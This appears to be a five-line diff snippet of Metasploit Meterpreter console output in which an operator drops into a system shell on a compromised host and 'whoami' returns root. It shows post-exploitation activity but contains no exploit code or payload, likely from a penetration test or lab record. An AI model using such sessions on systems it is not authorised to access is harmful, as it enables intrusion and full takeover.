@@ -1,0 +1,5 @@
+meterpreter > shell 
+Process 16545 created.
+Channel 3 created.
+whoami
+root
